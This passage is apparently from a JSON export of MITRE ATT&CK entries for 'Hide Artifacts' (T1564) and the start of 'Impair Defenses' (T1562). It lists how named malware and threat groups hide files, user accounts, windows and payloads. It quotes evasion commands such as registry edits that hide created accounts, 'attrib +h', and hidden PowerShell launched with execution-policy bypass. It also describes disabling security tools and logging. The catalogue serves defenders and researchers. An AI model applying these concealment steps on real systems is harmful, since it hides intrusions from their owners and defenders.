                        "Description": "<name> has been created with a hidden attribute to insure it's not visible to the victim.[49]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has the ability to set file attributes to hidden.[50]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> hides a copy of itself in the user's ~/Library directory by using a . at the beginning of the file name followed by 9 random characters.[51]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> can hide legitimate directories and replace them with malicious copies of the same name.[52]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has created a hidden directory under C:\\ProgramData\\Apple\\Updates\\ and C:\\Users\\Public\\Documents\\Flash\\.[53][54]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> uses attrib +h to make some of its files hidden.[55]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> has copied a random file from the Windows System32 folder to the %APPDATA% location under a different hidden filename.[56]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses a hidden folder named .xcassets and .git to embed itself in Xcode.[57]"
                    }
                }
            },
            "002": {
                "name": "Hidden Users",
                "href": "/techniques/T1564/002",
                "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file.[1] Every user has a userID associated with it. When the Hide500Users key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the IsHidden attribute to 1. Adversaries can also hide a user\u2019s home folder by changing the chflags to hidden.[2] Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.[3][4]On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true).[5] Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
                "Procedure": {
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has modified the Registry to hide created user accounts.[4]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has run reg add \u2018HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u2019 /v to hide a newly created user.[6]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has modified the Registry to hide created user accounts from the Windows logon screen. [3]"
                    }
                }
            },
            "003": {
                "name": "Hidden Window",
                "href": "/techniques/T1564/003",
                "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.[1]On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Similarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.[2]In addition, Windows supports the CreateDesktop() API that can create a hidden desktop window with its own corresponding explorer.exe process.[3][4]  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,[3] will be invisible to other desktops windows.",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has used ProcessWindowStyle.Hidden to hide windows.[5]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [6]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used the WindowStyle parameter to conceal PowerShell windows.[7] [8]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has been known to use -WindowStyle Hidden to conceal PowerShell windows.[9]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used the WindowStyle parameter to conceal PowerShell windows. [10] [11]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> loads its module with the XSL script parameter vShow set to zero, which opens the application with a hidden window. [12]"
                    },
                    "S1087": {
                        "ID": "S1087",
                        "Name": "AsyncRAT",
                        "Description": "<name> can hide the execution of scheduled tasks using ProcessWindowStyle.Hidden.[13]"
                    },
                    "S1053": {
                        "ID": "S1053",
                        "Name": "AvosLocker",
                        "Description": "<name> has hidden its console window by using the ShowWindow API function.[14]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> uses -windowstyle hidden to conceal a PowerShell window that downloads a payload.[15]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> has used -w hidden and -windowstyle hidden to conceal PowerShell windows. [16]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> has executed hidden PowerShell windows.[17]"
                    },
                    "G0079": {
                        "ID": "G0079",
                        "Name": "DarkHydrus",
                        "Description": "<name> has used -WindowStyle Hidden to conceal PowerShell windows. [18]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> has used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [19]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used hidcon to run batch files in a hidden console window.[20]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> has used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [21]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "<name> has used -WindowStyle hidden to conceal PowerShell windows.[22]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used a payload that creates a hidden window.[23]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has the ability to hide the window for operations performed on a given file.[24]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has executed legitimate tools in hidden windows.[25]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> can hide the current window from the targeted user via the ShowWindow API function.[26]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses -w Hidden to conceal a PowerShell window that downloads a payload. [27]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used an information gathering module that will hide an AV software window from the victim.[28]"
                    },
                    "S0437": {
                        "ID": "S0437",
                        "Name": "Kivars",
                        "Description": "<name> has the ability to conceal its activity through hiding active windows.[29]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has used the command Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden to hide its window.[30]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has used -WindowsStyle Hidden to hide the command window.[30]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.[31]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> can modify processes to prevent them from being visible on the desktop.[32]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has hidden its GUI using the ShowWindow() WINAPI call.[33]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can hide its console window upon execution to decrease its visibility to a victim.[34]"
                    },
                    "G0133": {
                        "ID": "G0133",
                        "Name": "Nomadic Octopus",
                        "Description": "<name> executed PowerShell in a hidden window.[35]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.[36]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A though <name> can only be run on Windows systems.[37]"
                    },
                    "S1076": {
                        "ID": "S1076",
                        "Name": "QUIETCANARY",
                        "Description": "<name> can execute processes in a hidden window.[38]"
                    },
                    "S0686": {
                        "ID": "S0686",
                        "Name": "QuietSieve",
                        "Description": "<name> has the ability to execute payloads in a hidden window.[39]"
                    },
                    "S1089": {
                        "ID": "S1089",
                        "Name": "SharpDisco",
                        "Description": "<name> can hide windows using ProcessWindowStyle.Hidden.[40]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> has the ability to set its window state to hidden.[41]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can execute PowerShell scripts in a hidden window.[42]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has the ability to hide the console window for its document search module from the user.[43]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has hidden malicious scripts using powershell.exe -windowstyle hidden. [44]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.[45]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> droppers have used COM properties to execute malware in hidden windows.[46]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has the ability of performing remote desktop access via a hVNC window for decreased visibility.[47]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> can instruct the OS to execute an application without a dock icon or menu.[48]"
                    }
                }
            },
            "004": {
                "name": "NTFS File Attributes",
                "href": "/techniques/T1564/004",
                "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. [1] Within MFT entries are file attributes, [2] such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). [1] [3] [4] [5]Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. [6] [4]",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> has used NTFS to hide files.[7]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> used NTFS alternate data streams to hide their payloads.[8]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can abuse alternate data streams (ADS) to store content for malicious payloads.[9]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> has copied itself to the :bin alternate data stream of a newly created file.[10]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "The <name>.EMBED variant of <name> can embed its payload in an alternate data stream of a local file.[11]"
                    },
                    "S0404": {
                        "ID": "S0404",
                        "Name": "esentutl",
                        "Description": "<name> can be used to read and write alternate data streams.[12]"
                    },
                    "S0361": {
                        "ID": "S0361",
                        "Name": "Expand",
                        "Description": "<name> can be used to download or copy a file into an alternate data stream.[13]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.[14]"
                    },
                    "S0397": {
                        "ID": "S0397",
                        "Name": "LoJax",
                        "Description": "<name> has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.[15]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> hides many of its backdoor payloads in an alternate data stream (ADS).[16]"
                    },
                    "S0145": {
                        "ID": "S0145",
                        "Name": "POWERSOURCE",
                        "Description": "If the victim is using PowerShell 3.0 or later, <name> writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\.[17]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "The <name> malware platform uses Extended Attributes to store encrypted executables.[18]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has the ability save and execute files as alternate data streams (ADS).[19][20][21]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> has the ability to save and execute files as an alternate data stream (ADS).[22]"
                    },
                    "S0027": {
                        "ID": "S0027",
                        "Name": "Zeroaccess",
                        "Description": "Some variants of the <name> Trojan have been known to store data in Extended Attributes.[23]"
                    }
                }
            },
            "005": {
                "name": "Hidden File System",
                "href": "/techniques/T1564/005",
                "description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.[1]Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.[1][2] Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.[3] Adversaries may also fragment files across the existing file system structure in non-standard ways.[4]",
                "Procedure": {
                    "S0114": {
                        "ID": "S0114",
                        "Name": "BOOTRASH",
                        "Description": "<name> has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.[2]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.[3]"
                    },
                    "G0020": {
                        "ID": "G0020",
                        "Name": "Equation",
                        "Description": "<name> has used an encrypted virtual file system stored in the Windows Registry.[4]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "<name> has used a hidden file system to store some of its components.[5]"
                    },
                    "G0041": {
                        "ID": "G0041",
                        "Name": "Strider",
                        "Description": "<name> has used a hidden file system that is stored as a file on disk.[6]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.[7]"
                    }
                }
            },
            "006": {
                "name": "Run Virtual Instance",
                "href": "/techniques/T1564/006",
                "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.[1]Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.[2]",
                "Procedure": {
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.[3]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so <name> can encrypt files on the shared drives as well as the local machine.[4]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables <name> to encrypt files on the host operating system, including files on any mapped drives.[2]"
                    }
                }
            },
            "007": {
                "name": "VBA Stomping",
                "href": "/techniques/T1564/007",
                "description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.[1]MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.[2][3]An adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.[4][1][5]",
                "Procedure": {}
            },
            "008": {
                "name": "Email Hiding Rules",
                "href": "/techniques/T1564/008",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.[1][2][3][4]Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines. [5]In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[6] Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "Procedure": {
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as \"hacked,\" \"phish,\" and \"malware\" in a likely attempt to prevent organizations from communicating about their activities.[7]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.[8]"
                    }
                }
            },
            "009": {
                "name": "Resource Forking",
                "href": "/techniques/T1564/009",
                "description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.[1] Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using ls -l@ or xattr -l commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder.[2][3]Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.[4][5]",
                "Procedure": {
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.[6]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.[5][4]"
                    }
                }
            },
            "010": {
                "name": "Process Argument Spoofing",
                "href": "/techniques/T1564/010",
                "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.[1][2]Adversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API WriteProcessMemory() function) then resume process execution with malicious arguments.[3][2][4]Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.[5]This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.",
                "Procedure": {
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use spoof arguments in spawned processes that execute beacon commands.[6]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> has the ability to modify its process memory to hide process command-line arguments.[5]"
                    }
                }
            },
            "011": {
                "name": "Ignore Process Interrupts",
                "href": "/techniques/T1564/011",
                "description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.[1]  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using nohup, PowerShell -ErrorAction SilentlyContinue, or similar commands that may be immune to hangups.[2][3] This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.Hiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.",
                "Procedure": {
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "The <name> Linux variant has been executed with the nohup command to ignore hangup signals and continue to run if the terminal session was terminated.[4]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> has used the nohup command to instruct executed payloads to ignore hangup signals.[5]"
                    }
                }
            },
            "012": {
                "name": "File/Path Exclusions",
                "href": "/techniques/T1564/012",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.[1]Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.[1][2][3]Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.[4]",
        "Procedure": {
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x.[5]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware has used %HiddenReg% and %HiddenKey% as part of its persistence via the Windows registry.[6]"
            },
            "S0402": {
                "ID": "S0402",
                "Name": "OSX/Shlayer",
                "Description": "malware has used the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\" or mktemp -t Installer.[7][5][8]"
            },
            "S1011": {
                "ID": "S1011",
                "Name": "Tarrask",
                "Description": "malware is able to create \"hidden\" scheduled tasks by deleting the Security Descriptor (SD) registry value.[9]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through IFileOperation.[10]"
            }
        }
    },
    "T1562": {
        "ttp_name": "Impair Defenses",
        "ttp_id": "T1562",
        "href": "/techniques/T1562",
        "subtechnique": {
            "001": {
                "name": "Disable or Modify Tools",
                "href": "/techniques/T1562/001",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.[1]Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.[2][3] Adversaries may also focus on specific applications such as Sysmon. For example, the \"Start\" and \"Enable\" values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging.[4] On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.[5][6]In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.[7][8][9][10] For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.[9]Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.[11]",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team modified in-registry internet settings to lower internet security. [12]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has the capability to kill any running analysis processes and AV software.[13]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has attempted to stop endpoint detection and response (EDR) tools on compromised systems.[14]"
                    },
                    "S0640": {
                        "ID": "S0640",
                        "Name": "Avaddon",
                        "Description": "<name> looks for and attempts to stop anti-malware solutions.[15]"
                    },
                    "S0638": {
                        "ID": "S0638",
                        "Name": "Babuk",
                        "Description": "<name> can stop anti-virus services on a compromised host.[16]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.[17]"
                    },
                    "S0252": {
                        "ID": "S0252",
                        "Name": "Brave Prince",
                        "Description": "<name> terminates antimalware processes.[18]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has incorporated code into several tools that attempts to terminate anti-virus processes.[19]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> can change browser security settings to enable extensions to be installed. <name> uses the pkill cfprefsd command to prevent users from inspecting processes.[20][21]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.[22]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> can alter the victim's proxy configuration.[23]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> can uninstall or disable security products.[24]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.[25][26]"
                    },
                    "S0608": {
                        "ID": "S0608",
                        "Name": "Conficker",
                        "Description": "<name> terminates various services related to system security and Windows.[27]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors disabled logging and modified the compcheckresult.cgi component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.[28][29]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> can disable Security Center functions like anti-virus.[30][31]"
                    },
